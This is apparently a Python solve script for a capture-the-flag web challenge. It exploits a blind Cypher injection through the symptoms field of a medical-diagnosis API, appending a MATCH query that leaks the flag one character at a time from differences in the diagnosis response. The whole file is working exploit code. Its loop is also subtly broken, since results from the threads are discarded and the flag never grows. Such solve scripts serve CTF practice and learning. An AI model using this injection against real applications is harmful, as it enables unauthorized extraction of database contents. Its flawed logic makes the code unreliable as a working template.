import requests
import random
import string
import threading

url = "http://dead-or-alive.ctfz.one"

def try_character(session, flag, character):
    ssn = ''.join(random.choices(string.ascii_letters + string.digits, k=3))
    session.post(url + '/api/setUser', json={"ssn":ssn,"fullname":"abc90","dateOfBirth":"1/1/1999","weight":"100"}, verify=False)
    payload = "Fatigue']\u000aMATCH (f:Flag) WHERE f.flag STARTS WITH '####'//".replace("####", flag + character)
    session.post(url + '/api/setSymptoms', json={"ssn":ssn,"symptoms":["Anxiety","Obsessions","Difficulty concentrating","Compulsions", payload]}, verify=False)
    r = session.post(url + '/api/getDiagnosis', json={"ssn":ssn}, verify=False)
    if "Obsessive-compulsive disorder (OCD)" in r.text:
        return character
    return None

def main():
    flag = "ctfzone{"
    all_characters = string.ascii_letters + string.digits + string.punctuation

    with requests.Session() as session:
        threads = []
        for i in all_characters:
            thread = threading.Thread(target=try_character, args=(session, flag, i))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    print("Flag: ", flag)

if __name__ == "__main__":
    main()
